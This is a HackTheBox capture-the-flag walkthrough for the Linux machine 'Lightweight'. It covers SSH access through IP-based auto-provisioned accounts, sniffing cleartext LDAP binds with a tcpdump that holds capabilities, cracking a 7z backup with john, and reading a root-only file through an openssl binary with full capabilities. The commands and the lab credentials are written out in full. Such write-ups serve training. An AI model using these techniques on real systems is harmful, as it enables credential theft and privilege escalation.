# CTF Walkthrough: Lightweight

**Platform:** HackTheBox | **OS:** Linux (CentOS) | **Difficulty:** Medium | **IP:** 10.129.95.236

## Executive Summary

Lightweight is a clever box centered around LDAP enumeration and Linux capabilities abuse. The web app auto-provisions SSH accounts based on visitor IP. By using `tcpdump` (with `cap_net_raw+ep`) to sniff cleartext LDAP authentication on localhost, we capture ldapuser2's credentials. A password-protected backup archive in ldapuser2's home reveals ldapuser1 credentials. Finally, ldapuser1 has access to a custom `openssl` binary with all Linux capabilities (`=ep`), allowing direct file read as root.

---

## Reconnaissance

### Nmap

Full TCP port scan identifies three open services:

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
```

**Analysis:** The box runs a web server (Apache + PHP 5.4) with LDAP backend (OpenLDAP). SSH is restricted — the challenge is gaining credentials. The LDAP service listening on port 389 suggests user authentication happens via LDAP.

### Web Enumeration

Visiting `http://10.129.95.236/user.php`:

```
Your account
If you did not read the info page, please go there the and read it carefully.
This server lets you get in with ssh. Your IP (10.10.14.2) is automatically 
added as userid and password within a minute of your first http page request.
```

**Key Finding:** The application auto-provisions SSH accounts where both username and password equal the visiting client's IP address.

---

## Shell as 10.10.14.2 (Initial Access)

### Auto-Provisioning Mechanism

The web app automatically registers IP addresses as SSH credentials via LDAP. Our attacking IP is `10.10.14.2`.

### Exploitation

SSH into the box using auto-provisioned credentials:

```bash
sshpass -p '10.10.14.2' ssh -o PreferredAuthentications=password 10.10.14.2@10.129.95.236
```

**Proof of Access:**
```bash
$ id
uid=1002(10.10.14.2) gid=1002(10.10.14.2) groups=1002(10.10.14.2)
```

### Capability Enumeration

Check which binaries have Linux capabilities set:

```bash
/sbin/getcap -r /usr/sbin/ /usr/bin/ 2>/dev/null
```

**Key Findings:**
```
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
```

`tcpdump` with `cap_net_raw+ep` can capture network traffic without root privilege.

---

## Lateral Movement: ldapuser2

### LDAP Sniffing via tcpdump

LDAP authentication happens on localhost (port 389) using cleartext Simple Bind. Use tcpdump to capture LDAP traffic:

```bash
/usr/sbin/tcpdump -i lo -nn -s0 -w /tmp/ldap_capture.pcap
# (Run for ~60 seconds while web app performs LDAP queries)
```

Parse the pcap for cleartext credentials:

```bash
/usr/sbin/tcpdump -r /tmp/ldap_capture.pcap -nn -A 2>/dev/null | strings | grep -i 'ldapuser'
```

**Captured Credentials:**
```
uid=ldapuser2,ou=People,dc=lightweight,dc=htb
8bc8251332abe1d7f105d3e53ad39ac2
```

### Accessing ldapuser2

Since external SSH to ldapuser2 is blocked, use `su` from within our provisioned account:

```bash
su - ldapuser2
Password: 8bc8251332abe1d7f105d3e53ad39ac2
```

**Proof:**
```bash
$ id
uid=1001(ldapuser2) gid=1001(ldapuser2) groups=1001(ldapuser2)
$ cat ~/user.txt
d2b2088f03bd33f092be52ed1275737a
```

---

## Lateral Movement: ldapuser1

### Password-Protected Archive Discovery

In ldapuser2's home directory:

```bash
ls -la ~
-rw-r--r--. 1 root      root         3411 Jun 14  2018 backup.7z
```

The archive is owned by root but readable by ldapuser2. Extract and check contents:

```bash
7z l backup.7z
```

The archive is encrypted with AES (Method: LZMA2:12k 7zAES).

### Password Cracking

Generate a john-compatible hash and crack with rockyou wordlist:

```bash
7z2john backup.7z > backup.hash
john --wordlist=/tmp/rockyou.txt backup.hash
```

**Cracked Password:** `delete`

### Archive Contents

Extract with the cracked password:

```bash
7z x -pdelete backup.7z
```

Contents: `index.php`, `info.php`, `reset.php`, `status.php`, `user.php`

The `status.php` file contains hardcoded LDAP credentials:

```php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
```

### Accessing ldapuser1

From ldapuser2's context, use `su` to switch to ldapuser1:

```bash
su - ldapuser1
Password: f3ca9d298a553da117442deeb6fa932d
```

**Proof:**
```bash
$ id
uid=1000(ldapuser1) gid=1000(ldapuser1) groups=1000(ldapuser1)
```

---

## Shell as root

### Capability Abuse: openssl with =ep

Enumerate ldapuser1's home directory:

```bash
ls -la ~
-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl
-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump
```

Check capabilities:

```bash
/sbin/getcap -r /home/ldapuser1/
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl = ep
```

**Critical Finding:** The custom `openssl` binary has `=ep` (empty capabilities suffix with effective and permitted flags), meaning **all Linux capabilities are enabled**. This binary can read/write any file on the system.

### File Read as root

Use the openssl binary to directly read `/root/root.txt`:

```bash
/home/ldapuser1/openssl enc -in /root/root.txt
```

**Proof:**
```
95d5efd63ace6c01677886b034404813
```

---

## Summary of Attack Chain

1. **Reconnaissance:** Identified web app, SSH, and LDAP services.
2. **Auto-Provisioning:** Gained initial SSH access using IP-based auto-enrollment.
3. **LDAP Sniffing:** Used `tcpdump` (cap_net_raw+ep) to capture cleartext LDAP bind for ldapuser2.
4. **Archive Extraction:** Cracked password-protected `backup.7z` to discover ldapuser1 credentials in PHP source.
5. **Privilege Escalation:** Leveraged custom `openssl` binary with all Linux capabilities to read root files directly.

**Key Lessons:**
- LDAP Simple Bind sends passwords in cleartext over TCP; sniffing is a viable attack if network access exists.
- Linux capabilities (`cap_*`) can be exploited if set on user-accessible binaries.
- Hardcoding credentials in backup files is a critical security risk.
- Fail2ban/iptables can temporarily ban aggressive scanning; adapt enumeration tactics accordingly.
